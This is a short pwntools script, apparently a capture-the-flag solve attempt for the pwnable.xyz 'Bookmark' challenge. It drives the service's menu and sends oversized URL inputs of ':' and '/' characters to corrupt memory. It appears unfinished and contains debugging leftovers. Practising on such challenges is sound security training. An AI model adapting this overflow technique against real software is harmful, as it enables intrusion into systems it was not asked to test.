from pwn import *

# Pwnable.xyz Bookmark challenge
# 100 points

"""
Web bookmarks.
Menu:
  1. Login
  2. Create url
  3. Print url
  4. Save url
  0. Exit
> 1
Password: ADmin
> 2
Secure or insecure: True
> 3   
url: True

"""

context(kernel="amd64", arch="amd64")

def main():
    e = ELF("challenge")
    if 0:
        p = process("./challenge")
        # gdb.attach(p)
    elif 0:
        p = process(["strace", "-o", "strace.out", "./challenge"])
    else:
        p = remote("svc.pwnable.xyz", 30021)

    # Set url
    p.sendlineafter(b"> ", b"2")
    p.sendafter(b": ", b"http::::")
    p.sendlineafter(b": ", b"112")
    p.send(b":"*112)

    print("Hello")

    # Print url
    p.sendlineafter(b"> ", b"3")
    p.recvline()

    for _ in range(4):
        p.sendlineafter(b"> ", b"2")
        p.sendafter(b": ", b"http////")
        p.sendlineafter(b": ", b"112")
        p.send(b"/"*112)

    # Print url
    p.sendlineafter(b"> ", b"3")
    print(p.recvline())

    p.sendlineafter(b"> ", b"4")
    print(p.sendlineafter(b"> ", b"0"))


main()